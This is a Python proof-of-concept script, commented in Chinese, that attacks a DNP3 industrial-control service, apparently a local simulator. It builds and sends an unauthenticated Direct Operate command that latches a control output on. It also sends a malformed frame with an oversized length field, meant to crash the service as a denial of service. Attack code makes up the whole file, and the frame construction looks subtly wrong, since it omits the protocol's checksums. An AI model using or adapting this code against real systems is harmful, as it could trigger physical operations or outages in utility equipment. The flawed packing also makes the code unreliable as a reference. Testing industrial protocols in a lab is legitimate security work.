import socket
import struct
from dnp3_detector import detect_dnp3

TARGET = ('127.0.0.1', 20000)

def build_direct_operate(address=0x0000, code=0x03):
    """
    构造 DNP3 未授权直接操作 (Direct Operate) 请求
    对象组12变种1 (控制输出)，控制码 0x03 (LATCH ON)
    """
    # 应用层功能码 0x05 (Direct Operate), IIN=0x0000
    app_func = 0x05
    iin = 0x0000

    # 对象12变种1头部：组(0x0C) 变种(0x01) 标志(0x17) 地址(2字节小端)
    obj_header = struct.pack('<BBB', 0x0C, 0x01, 0x17)  # 组, 变种, 标志
    addr_bytes = struct.pack('<H', address)             # 点地址
    # 控制码 + 状态
    ctrl_status = struct.pack('<BB', code, 0x00)        # 控制码, 状态

    app_data = struct.pack('<BH', app_func, iin) + obj_header + addr_bytes + ctrl_status

    # 链路层
    start = b'\x05\x64'
    length = len(app_data) + 5   # 控制1 + 目的2 + 源2
    control = 0x44               # 非确认用户数据请求
    dst = 1
    src = 100
    # 修正格式：<BBHH (1B长度, 1B控制, 2B目的, 2B源)
    frame = start + struct.pack('<BBHH', length, control, dst, src) + app_data
    return frame

def build_oversized_length():
    """构造畸形帧：长度字段声明为 0xFF，但实际数据很短（溢出测试）"""
    start = b'\x05\x64'
    control = 0x44
    dst = 1
    src = 100
    frame = start + struct.pack('<BBHH', 0xFF, control, dst, src) + b'\x00' * 5
    return frame

def poc_unauth_direct_operate():
    print("\n[PoC] 尝试未授权直接操作 (Direct Operate)...")
    payload = build_direct_operate()
    print("[PoC] 发送报文:")
    detect_dnp3(payload)

    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        resp = sock.recv(1024)
        print(f"[模拟器] 响应: {resp.hex()}")
    except Exception as e:
        print(f"[模拟器] 异常: {e}")
    finally:
        sock.close()

def poc_oversized_length():
    print("\n[PoC] 发送畸形长度帧 (长度0xFF，实际短)...")
    payload = build_oversized_length()
    print("[PoC] 发送报文:")
    detect_dnp3(payload)

    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        resp = sock.recv(1024)
        print(f"[模拟器] 响应: {resp.hex()}")
    except socket.timeout:
        print("[模拟器] 超时未响应，可能服务崩溃 (DoS)")
    except ConnectionResetError:
        print("[模拟器] 连接被重置，服务可能异常")
    except Exception as e:
        print(f"[模拟器] 异常: {e}")
    finally:
        sock.close()

if __name__ == '__main__':
    print("DNP3 PoC 测试开始，目标：{}:{}".format(*TARGET))
    poc_unauth_direct_operate()
    poc_oversized_length()